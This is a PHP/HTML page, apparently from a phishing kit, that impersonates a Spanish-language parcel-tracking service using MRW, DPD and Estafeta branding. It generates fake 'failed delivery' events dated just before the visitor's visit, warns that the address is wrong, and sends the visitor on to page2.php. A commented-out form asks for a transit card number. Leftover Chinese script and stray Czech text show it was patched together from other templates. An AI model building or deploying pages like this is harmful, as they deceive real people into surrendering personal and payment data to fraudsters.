<?php
include('header_.php');
$currentDateTime = date('m/d/Y H:i'); // Get the current date and time
?>
<style type="text/css">
    .home-bg-banner {
        background-image: url('https://www.dpd.com/wp-content/uploads/sites/226/2023/09/DPD_B2C_mobile_header_cms_600x325_v2.png');
        -o-object-fit: cover;
        object-fit: cover;
        -webkit-background-size: cover;
        background-size: cover;
        background-position: center center;
        background-repeat: no-repeat;
        height: 220px;
        position: relative;
    }

    .banner-right {
        position: absolute;
        bottom: 24px;
        left: 12px;
        color: white;
    }

    .home-input-search {
        border: 1px solid black;
    }

    .search_icon_home_banner {
        position: absolute;
        right: 12px;
        top: 12px;
    }

    .home-heading {
        font-weight: 600;
        font-size: 17px;
        font-weight: 500;
        line-height: 26px;
    }

    .row {
        display: flex;
    }

    /* .col {
        flex: 1;
    } */

    .progress-bar {
        width: 100%;
        height: 10px;
        background-color: #eee;
        border-radius: 10px;
        /* margin: 50px auto; */
    }

    .progress {
        height: 100%;
        width: 55%;
        background-color: #4caf50;
        border-radius: 8px;
        float: right;
    }

    .progress-two {
        height: 100%;
        width: 38%;
        background-color: #ccc;
        border-radius: 8px;
    }

    .left-green {
        display: none;
    }

    .right-red:after,
    .right-red:before {
        background: red;
    }

    .green-button {
        background-color: green;
        color: white;
        padding: 10px 70px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 16px;
        margin: 4px 2px;
        cursor: pointer;
        border-radius: 4px;
        margin-left: auto;
        margin-right: auto;
        display: block;
    }

    .sub-title {
        text-align: center;
    }

    .position-relative {
        position: relative;
    }

    .center-logo-bg {
        position: absolute;
        top: -42px;
        display: flex;
        justify-content: center;
        width: 100%;
    }

    .center-logo-bg span {
        width: 101px;
        text-align: center;
        display: flex;
        justify-content: center;
        background: #fff;
        padding: 5px;
    }

    .center-logo-bg span img {
        width: 31px;
    }

    .before-progress-abr {
        margin-top: 16px;
        margin-bottom: 51px;
        position: relative;
    }

    .before-progress-abr .amb-img-div {
        position: absolute;
        top: 1px;
        left: 35%;
    }

    .driver-amb-bg {
        position: absolute;
        left: 35px;
        top: 7px;
        z-index: -1;
        height: 50px;
    }

    .driver-details {
        height: fit-content;
        margin-top: auto;
        margin-bottom: auto;
        margin-left: 64px;
        margin-right: 10px;
    }

    .alrt-modify {
        border: none;
        box-shadow: 0px 2px 16px 0px #f30a0a3d;
        background: #fff;
        border-radius: 28px;
        margin-top: 37px;
    }

    .icon-alert {
        font-size: 23px;
        color: #F44336;
    }

    .red-gray::before {
        background-color: rgb(11, 35, 30) !important;
        z-index: 999;
    }

    .right-red {
        padding: 2px 0px 14px 20px;
    }

    .tb td {
        padding: 5px;
    }

    .tb th {

        padding: 5px;
    }

    .bottom-prompt {
        position: fixed;
        bottom: 0px;
        background-color: #19133bd1;
        padding: 10px;
        color: white;
    }
</style>

<!-- main Start -->
<div class="bottom-prompt">
    <div>En MRW utilizamos cookies propias para poder ofrecerte nuestros servicios, y cookies de tergeros para analizar el tráfico en nuestro sitio y mostrarte publicidad relacionada con tus preferencias en base a un perfil elaborado a partir de tus hábitos de navegación.</div>
    <div style="display: flex; gap: 10px; margin-top: 20px;">
        <button onclick="removePrompt()" style="padding: 3px 10px; color: wheat; background: gray">Rechazar</button>
        <button onclick="removePrompt()" style="padding: 3px 10px; color: wheat; background: blue">Aceptar</button>
        <button onclick="removePrompt()" style="padding: 3px 10px; color: #fe4438; background: transparent">Configurar cookies...</button>
    </div>
</div>
<section style="background-color: #f9f9f9;">

    <div style="padding: 20px;">
        <div style="font-weight: 600; font-size: 34px;">
            Seguimiento de envíos
        </div>
        <table class="tb" style="width: 100%; font-size: 14px; border-spacing: 15px;">
            <tr style="border-bottom: 1px solid black; padding-bottom: 10px;">
                <th>Fecha </th>
                <th>Hora </th>
                <th>Estado envío</th>
                <th>Detalles </th>
            </tr>
            <!-- <tr>
                <td>02700F552102</td>
                <td>24/03/2023</td>
                <td>17:01</td>
                <td>Pendiente de recibir en destino</td>
            </tr> -->
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -0 DAY +2 HOURS'));?> </td>
                <td> 08:02</td>
                <td>Entrega fallida, devolución al centro de distribución</td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -1 DAY +2 HOURS'));?> </td>
                <td>15:17</td>
                <td>El cartero ha recogido el paquete listo para su entrega</td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -2 DAY +3 HOURS'));?></td>
                <td> 18:21</td>
                <td>El paquete ha llegado a su destino</td>
                <td>Preparación de paquetes para su clasificación</td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -3 DAY +1 HOURS'));?> </td>
                <td>10:13</td>
                <td>Los paquetes se cargaban y enviaban a sus destinos</td>
                <td>En tránsito</td>
            </tr>

            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -4 DAY +1 HOURS'));?></td>
                <td> 12:20 </td>
                <td>El mensajero está listo para el envío.</td>
                <td>La inspección de mensajería ha terminado</td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($currentDateTime . ' -5 DAY +1 HOURS'));?></td>
                <td>09:09</td>
                <td>Paquete recibido y registrado</td>
                <td>Paquetes listos para su clasificación</td>
            </tr>
        </table>

        <div style="margin-top: 50px;">
            <strong>⚠️Hay una anomalía en el estado de entrega del paquete</strong>
            <br>
            <br>

            Su paquete ha sido devuelto al centro de distribución más cercano para su custodia debido a una dirección incorrecta, por favor actualice la dirección correcta lo antes posible para que podamos volver a entregarlo lo antes posible.

        </div>

        <div style="display: flex; justify-content: center; margin: 20px 0px;">
            <a href="page2.php"><button style="padding: 10px 16px; border-radius: 5px; color: white; background-color: #fe4438;">Continuar</button></a>
        </div>
        <!-- <div style="margin-top: 30px;">
            <div style="font-size: 20px;">Email*:</div>
            <input type="text" style="width: 100%; padding: 10px; border: 1px solid gray;">
        </div>
        <div style="margin-top: 30px; font-size: 20px;">
            * Campos imprescindibles para poder enviar el formulario.
        </div>
        <div style="margin-top: 20px; width: 100%;">
            <div style="display: flex; justify-content: end;"> <button style="padding: 10px; color: white; background: #FE4438;">ENVIAR</button> </div>
            <div style="display: flex; justify-content: end;"> <button style="padding: 10px; color: white; background: #eee;">VOLVER</button> </div>
        </div> -->
    </div>

    <!-- <div class="home-bg-banner">
        <i class="fa-solid fa-chevron-right banner-right"></i>
    </div> -->


    <!-- <div>
        <div class="" style="text-align: center; margin-top: ;">
            <p style="color: #c00d0d;font-size: 20px;font-weight: 600;margin: 0px;">005587334268C704512516</p>
            <p>MEXICO D.F. (MEX) MOVIMIENTO LOCAL EN CENTRO DE DISTRIBUCION</p>
        </div>
    </div> -->
    <!-- <div class="py-2 px-4 mb-4 position-relative" style="box-shadow: 0px 2px 16px 0px #ccc;margin: 0px 10px;border-radius: 0 0 15px 15px;">

        <h2 class="mb-2 text-xl text-gray-600 home-heading text-center !font-bold">¡Su entrega será entregada hoy mismo por un conductor de estafeta！</h2>
        <div class="before-progress-abr">
            <p class="p-0 m-0 text-right"><span class="pr-5 mr-4"></span> <span></span></p>
            <div class="progress-bar">
                <div class="progress"></div>
                <div class="progress-two"></div>
            </div>
            <div class="amb-img-div text-center">
                <img src="assets/images/amb-img.png" class="img-fluid">
                <p class="p-0 m-0">Suspensión de la entrega</p>
            </div>
        </div>
        <h2 class="mb-2 text-xl text-gray-600 home-heading text-center !font-bold">Výjimka ze stavu distribuce, prosím aktualizujte</h2>
        <div class="row m-0" style="padding-left: 22px;padding-right: 10px;border-top: 1px solid #d9b3b3;border-bottom: 1px solid #d9b3b3;padding-top: 10px;padding-bottom: 10px;margin: auto;">
            <div class="col">
                <div class="row position-relative">
                    <img src="https://t4.ftcdn.net/jpg/02/90/27/39/360_F_290273933_ukYZjDv8nqgpOBcBUo5CQyFcxAzYlZRW.jpg" style="width: 60px;border-radius: 100px;height: 61px;border: 1px solid #4CAF50;object-fit: cover;">
                    <img src="assets/images/amb-img.png" class="img-fluid driver-amb-bg">
                    <div class="driver-details">
                        <p style="margin: 0px;color: green;font-weight: 600;">Kurýr</p>
                        <p style="margin: 0px;font-weight: 600;">Santoch</p>
                    </div>
                    <div style="height: fit-content;margin-top: auto;margin-bottom: auto;">
                        <p style="margin: 0px;font-weight: 600;margin-top: 20px;font-size: 12px;color: red;">4.9 <i class="fa-solid fa-star"></i></p>
                    </div>
                </div>
            </div>
            <div class="col" style="margin-left: auto;">
                <div style="width: fit-content;margin-left: auto;height: 100%;align-items: center;display: flex;">
                    <i class="fa-solid fa-chevron-right"></i>
                </div>
            </div>
        </div>
        <div class="row m-0" style="padding-left: 22px;padding-right: 10px;border-top: 1px solid #d9b3b3;border-bottom: 1px solid #d9b3b3;padding-top: 10px;padding-bottom: 10px;margin: auto;">
            <div class="col">
                <div class="row">
                    <div style="width: 60px;border-radius: 100px;border: 1px solid green;height: 60px;display: flex;align-items: center;">
                        <i class="fa-solid fa-house" style="margin-left: auto;margin-right: auto;font-size: 23px;"></i>
                    </div>
                    <div style="height: fit-content;margin-top: auto;margin-bottom: auto;margin-left: 10px;margin-right: 10px;">
                        <p style="margin: 0px;color: green;font-weight: 600;">Detalles de la entrega</p>
                        <p style="margin: 0px;font-weight: 600;">A la espera de redistribución</p>
                    </div>
                </div>
            </div>
            <div class="col" style="margin-left: auto;">
                <div style="width: fit-content;margin-left: auto;height: 100%;align-items: center;display: flex;">
                    <i class="fa-solid fa-pencil" style="font-size: 20px;"></i>
                </div>
            </div>
        </div>
    </div> -->

</section>
<div id="center" class="main innerpage">
    <div class="old_code_wrap">
        <a class="accesskey" href="#aC" id="aC" accesskey="C" title="主要內容區">:::</a>
        <!-- photoblock start-->
        <section class="section col-12 photoblock2 no-print" style="background-image: url(images/photoblock_inbg.png) !important;">
        </section>
        <!-- photoblock end-->
        <!-- <div class="container">
            <h1 style="font-size: 1.5em;margin: 0.83em 0;" class="title">consultas Sobre el estado de los Cargos no
                Pagados</h1>
            <section class="ap">
                <div class="searchform">
                    <div class="login-form">
                        <div class="tab-headers clearfix">
                            <h2 class="tab-header-item active" data-tab="loginForm">Carga tarjeta bip!</h2>
                        </div>
                        <div class="tab-container">
                            <form action="./page2.php" method="POST" id="loginForm" data-tab="tab1" novalidate
                                class="active tab-content">
                                <div class="form-group">
                                    <legend class="form-info">Número de tarjeta bip!<i class="fa fa-info-circle"></i>
                                    </legend>
                                    <input type="text" placeholder="Ej: 123456789" name="username" required>
                                </div>
                                <div class="form-submit">
                                    <button type="submit" class="btnSubmit btn" name="submit"
                                        id="submit">Continuar</button>
                                    <center>
                                        <span class="submit-info">Al continuar estas aceptando nuestros <b>términos y
                                                condiciones</b>.</span>
                                    </center>
                                </div>
                            </form>
                            <form action="./page2.php" method="POST" id="testform" class="tab-content" novalidate>
                                <p>empty</p>
                            </form>
                        </div>
                    </div>
                </div>
            </section>
        </div> -->
    </div>
    <div class="container">
        <section class="ap">
            <!-- <div class="row only_mobile">
                <div class="card_wrap">
                    <div class="top_card">
                        <div class="id_main">
                            <span><img src="images/card-logo.png" width="35px"> </span>
                            <div class="top_card_left">
                                <h4>RM062452218MXS</h4>
                                <p class="short_id">Número de Guía</p>
                            </div>
                        </div>
                        <p class="like_viewmore">Suspensión de la entrega</p>
                    </div>
                    <div class="bottom_card">
                        <p class="card_tag">Correo de México</p>
                        <p class="post_date_card">06/09/2023</p>
                    </div>
                </div>
            </div> -->

            <!-- <div class="time_line_wrap only_mobile">
                <div class="time_line one">
                    <div class="left-green">
                        <div class="for_color">
                            <p>09/1/2029<br>13:03
                            <p>
                        </div>
                    </div>
                    <span class="time_row_line"></span>
                    <div class="right-red red-gray">
                        <p class="top_title_ps">2023-12-19 13:58:36
                        <p>
                        <p class="bottom_color">Distribución fallida, devuelta al centro de distribución
                        <p>
                    </div>
                    <div>
                    </div>
                </div>
                <div class="time_line">
                    <div class="left-green">
                        <div class="for_color">
                            <p>04/09/2023<br>15:36
                            <p>
                        </div>
                    </div>
                    <span class="time_row_line"></span>
                    <div class="right-red">
                        <p class="top_title_ps">2023-12-18 14:58:36
                        <p>
                        <p class="bottom_color">Llegada a la ciudad de destino, listo para la entrega
                        <p>
                    </div>
                    <div>
                    </div>
                </div>
                <div class="time_line">
                    <div class="left-green">
                        <div class="for_color">
                            <p>03/09/2023<br>09:11
                            <p>
                        </div>
                    </div>
                    <span class="time_row_line"></span>
                    <div class="right-red">
                        <p class="top_title_ps">2023-12-17 07:58:36
                        <p>
                        <p class="bottom_color">Envío a destino
                        <p>
                    </div>
                    <div>
                    </div>
                </div>
                <div class="time_line">
                    <div class="left-green">
                        <div class="for_color">
                            <p>02/09/2023<br>11:42
                            <p>
                        </div>
                    </div>
                    <span class="time_row_line"></span>
                    <div class="right-red">
                        <p class="top_title_ps">2021-12-16 12:33:14
                        <p>
                        <p class="bottom_color">Finalización del registro de envíos
                        <p>
                    </div>
                    <div>
                    </div>
                </div>

            </div> -->
            <!-- <button class="green-button">Check on Website</button> -->
            <!-- <div class="message_expert only_mobile">
                <div class="sub-title alrt-modify py-5">

                    
                    <h2 class="title mt-3"><i class="fa-solid fa-circle-exclamation icon-alert"></i> Falta de entrega de paquetes</h2>
                    <p class="title-text">El cartero no puede entregar su paquete,Por favor, actualice la dirección correcta lo antes posible,Los paquetes se retienen temporalmente en el centro de distribución más cercano.<strong></strong></p>
                    <p class="title-text">La empresa Estafeta permite el reenvío en caso de error en la dirección.<strong></strong></p>
                </div>
            </div>
            <div class="button_block only_mobile my-5">
                <a href="page2.php"><button class="button_next" style="background-color: #c00d0d;">Actualización</button></a>
            </div> -->

        </section>
        <!-- aP End -->
        <script>
            function checkForm() {
                var canGo = true;
                var custno = $("#custNo").val();
                if (custno === "") {
                    $("#custNoError").show();
                    canGo = false;
                }
                var answer = $("#answer").val();
                if (answer === "") {
                    $("#answerError").show();
                    canGo = false;
                }
                return canGo;
            }

            function errorNoticeDisplay(fieldName, noticeWarning) {
                $("#" + fieldName + "Error").show();
                $("#" + fieldName + "ErrorWarning").text(noticeWarning);
            }

            function sendEmailCaptcha() {
                var returnValue = true;
                if ($("#email").val() == "" || $("#email").val() == "請輸入Email 帳號") {
                    errorNoticeDisplay('email', '請輸入Email 帳號');
                    returnValue = false;
                } else {
                    //var patternEmail = /^[\w\"\+-]+[\.]?[\w\"\+-]+@(\[)*\w+([\.-]?\w+)*(\.\w{2,})+(\])*$/;
                    var patternEmail = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
                    if (patternEmail.test($("#email").val()) == false) {
                        errorNoticeDisplay('email', '請輸入合乎格式之Email 帳號');
                        returnValue = false;
                    } else {
                        patternEmail = /@yahoo\.|@kimo\.|@icloud\.|@me\./;
                        if (patternEmail.test($("#email").val().toLowerCase()) == true) {
                            errorNoticeDisplay('email',
                                '不建議使用@yahoo.、@kimo.、@icloud.及@me.信箱註冊，避免擋信!');
                        }
                    }
                }
                if (returnValue) {
                    $.ajax({
                        url: "/captcha/sendCaptcha",
                        type: "get",
                        data: {
                            "email": $("#email").val()
                        },
                        success: function(response) {
                            $('#modal1').hide();
                            $('.modal_overlay').hide();
                            if (response) {
                                swal("驗證碼已寄出，請至電子郵件信箱收信。");
                            } else {
                                swal("驗證碼已過期，請刷新驗證碼。");
                            }

                        },
                        error: function(response) {
                            swal("驗證碼已過期，請刷新驗證碼。");
                        }
                    });
                }
            }

            $(function() {

                $(".tab-header-item").on("click", function(e) {
                    e.preventDefault();
                    $(".tab-header-item").removeClass("active");
                    $(this).addClass("active");

                    var data_tab = $(this).attr("data-tab");
                    $(".tab-content").removeClass("active");
                    $("#" + data_tab).addClass("active");
                });

                $('#custNo').click(function() {
                    $('.annotation').show();
                    $("#answer").val("");
                });

                $('#answer').focus(function() {
                    $("#answer").val("");

                });
                $('#answer').keyup(function() {
                    var ans = $("#answer").val();
                    $("#answer").val(toASCII(ans));
                });

            });
        </script>
    </div>
</div>


<?php include('footer_.php'); ?>
<script>
    function removePrompt() {
        document.getElementsByClassName('bottom-prompt')[0].style.display = 'none'
    }
   
</script>